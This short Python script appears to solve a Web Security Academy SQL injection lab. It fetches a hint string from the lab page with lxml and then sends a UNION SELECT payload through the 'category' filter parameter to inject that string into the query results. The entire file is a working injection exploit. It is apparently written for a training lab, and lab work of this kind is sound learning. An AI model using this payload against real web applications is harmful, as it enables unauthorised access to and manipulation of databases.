import requests
from lxml import html

URL = "https://0a4e0061037737f28155523a00b40075.web-security-academy.net/"
response = requests.get(URL).text

parser = html.fromstring(response)
s = parser.xpath("//p[@id='hint']/text()")[0].split("'")[1]

requests.get(URL + f"filter?category=%27+UNION+SELECT+NULL,'{s}',NULL-- -")

